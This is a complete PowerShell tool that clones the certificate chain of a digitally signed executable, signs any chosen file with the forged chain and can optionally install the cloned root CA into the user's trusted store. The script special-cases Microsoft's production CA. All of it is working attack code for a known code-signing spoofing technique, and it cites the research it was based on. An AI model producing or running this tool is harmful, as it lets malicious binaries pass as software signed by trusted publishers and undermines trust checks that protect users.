<#
.SYNOPSIS
    Script to extract the chain of certificates from digitaly sined file and to sign your file with cloned certificates.
.DESCRIPTION
    Script to extract the chain of certificates from digitaly sined file and to sign your file with cloned certificates.
.PARAMETER OriginalFile
    Specifies a path to digitaly signed file (original file). 
.PARAMETER FileToSign
    Specifies a path to file to be signed by cloned certificate.
.EXAMPLE
    .\CloneCertificate -OriginalFile c:\temp\original.exe -FileToSign c:\temp\file.exe
    <Description of example>
.EXAMPLE
    .\CloneCertificate -OriginalFile c:\temp\original.exe -FileToSign c:\temp\file.exe -InstallCertificate
    <Description of example>

.NOTES
    This script was designed to extract and clone the certificate chain from digitaly signed files, and to sign your file 
    using the cloned certificate.  
    The idea of the script was taken from the post of great :)  Matt Graeber from amaizing SpectOps Team. 
    https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
    Author: dosomemagic
#>

function CloneCertificate
{

[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true, HelpMessage = 'File to extract certificate')]
        [ValidateScript({
            if( -Not ($_ | Test-Path) )
            {
                Write-Host "[!] ERROR: Can not find the original file."  -ForegroundColor Red
                Break
            }
            return $true
        })]
        [System.IO.FileInfo]$OriginalFile,

        [Parameter(Position = 1, Mandatory = $true, HelpMessage = 'File to sign')]
        [ValidateScript({
            if( -Not ($_ | Test-Path) )
            {
                Write-Host "[!] ERROR: Can not find the file to be signed."  -ForegroundColor Red
                Break
            }
            return $true
        })]
        [System.IO.FileInfo]$FileToSign,
		
        [Parameter(Position = 2, Mandatory = $false)]
		[switch]$InstallCert=$false
				
    )
    # Get original file path 
    $path = [System.IO.Path]::GetDirectoryName($OriginalFile)
    # Set p7b file name
    $p7b_FileName = "CertificateChain.p7b"
    # Set p7b export file name
    $p7b_OutputFile = Join-Path $path $p7b_FileName


    # Get all available certificates 
    Write-Host "[+] Getting Certificates from file"
    
    $availableFileCertificates = (Get-AuthenticodeSignature $OriginalFile).SignerCertificate
    if($availableFileCertificates -eq $null)
    {
        Write-Host "[!] ERROR: No valid certificates was found in original file."  -ForegroundColor Red
        Break
    }
    
    $certs = New-Object Security.Cryptography.X509Certificates.X509Certificate2Collection
    $chain = New-Object Security.Cryptography.X509Certificates.X509Chain
    $chain.ChainPolicy.RevocationMode = "NoCheck"
    [void]$chain.Build($availableFileCertificates)
    
    # Export the chain to P7B file
    $chain.ChainElements | ForEach-Object {[void]$certs.Add($_.Certificate)}
    $chain.Reset()
    Set-Content -Path $p7b_OutputFile -Value $certs.Export("pkcs7") -Encoding Byte -Force

    # Load P7B file
    [reflection.assembly]::LoadWithPartialName("System.Security") | Out-Null
    $data = [System.IO.File]::ReadAllBytes($p7b_OutputFile)
    $cms = new-object system.security.cryptography.pkcs.signedcms
    $cms.Decode($data)
    

    # Export All Certificates from P7B
    ($cms.Certificates) | ForEach-Object {
        if((($_.Extensions.CertificateAuthority -eq $true ) -and ($_.Extensions.HasPathLengthConstraint -eq $true)) -or (($_.Extensions.CertificateAuthority -eq $true ) -and ($_.Subject -eq "CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US")))
        {
            $SubCACert = $_
            Export-Certificate  -FilePath (Join-Path $path "Sub_CA.cer") -Cert $_ -Type CERT | Out-Null
            Write-Host "`t[v] SUB CA = " $_.Thumbprint -ForegroundColor Green
        }
        elseif (($_.Extensions.CertificateAuthority -eq $true ) -and ($_.Extensions.HasPathLengthConstraint -eq $false)) 
        {
            $RootCACert = $_
            Export-Certificate  -FilePath (Join-Path $path "Root_CA.cer") -Cert $_ -Type CERT  | Out-Null
            Write-Host "`t[v] Root CA = " $_.Thumbprint -ForegroundColor Green
        }
        elseif (($_.Extensions.CertificateAuthority -eq $false ) -and ($_.Extensions.HasPathLengthConstraint -eq $false)) 
        {
            $CodeSigningCert = $_
            Export-Certificate  -FilePath (Join-Path $path "Code_Signing.cer") -Cert $_ -Type CERT | Out-Null
            Write-Host "`t[v] Code Signing = " $_.Thumbprint -ForegroundColor Green
        }
        else
        {
            Write-Host "[!] ERROR: No Valid Certificates Found. Exiting"  -ForegroundColor Red
            Exit
        }
    } 

    # Clone All Certificates
    Write-Host "[+] Cloning Certificates" 
    try
    {
        $CertStoreLocation = @{ CertStoreLocation = 'Cert:\CurrentUser\My' }
        
        $Cloned_Root_Cert = New-SelfSignedCertificate -CloneCert $RootCACert @CertStoreLocation
        Write-Host "`t[v] Root CA" -ForegroundColor Green
        $Cloned_SubCA_Cert = New-SelfSignedCertificate -CloneCert $SubCACert -Signer $Cloned_Root_Cert @CertStoreLocation
        Write-Host "`t[v] Sub CA" -ForegroundColor Green
        $Cloned_Signing_Cert = New-SelfSignedCertificate -CloneCert $CodeSigningCert -Signer $Cloned_SubCA_Cert @CertStoreLocation
        Write-Host "`t[v] Code Signing"  -ForegroundColor Green
    }
    Catch
    {
        $ErrorMessage = $_.Exception.Message
        $FailedItem = $_.Exception.ItemName
        Write-Host("Error: `r`n", $ErrorMessage, $FailedItem)
    } 
    
    Write-Host "[+] Signing file"    
    Set-AuthenticodeSignature -Certificate $Cloned_Signing_Cert -FilePath $FileToSign -IncludeChain "All" -TimestampServer "http://timestamp.verisign.com/scripts/timstamp.dll" | Out-Null  
    
    # Exporting Cloned Certificates
    Export-Certificate -Type CERT -FilePath (Join-Path $path "Cloned_Root_CA.cer") -Cert $Cloned_Root_Cert | Out-Null
    Export-Certificate -Type CERT -FilePath (Join-Path $path "Cloned_SubCA_CA.cer") -Cert $Cloned_SubCA_Cert | Out-Null
    Export-Certificate -Type CERT -FilePath (Join-Path $path "Cloned_Signing_Cert.cer") -Cert $Cloned_Signing_Cert | Out-Null
    
    if($InstallCert)
    {
    #Install Cloned Root CA 
    Import-Certificate -FilePath (Join-Path $path "Cloned_Root_CA.cer") -CertStoreLocation Cert:\CurrentUser\Root\ -Confirm | Out-Null
    Write-Host "[+] Checking Certificate after signing" 
    # Verify file certtificate 
    Get-AuthenticodeSignature -FilePath $FileToSign  | Format-Table
    }
    else
    {
        Write-Host "[+] Checking file signature" 
        # Verify file certtificate 
        Get-AuthenticodeSignature -FilePath $FileToSign 
        Write-Host 
        Write-Host "`r`n[!] The file is signed but untrusted. To get a valid signature you need to install Cloned Root CA." -ForegroundColor Yellow
    }
}
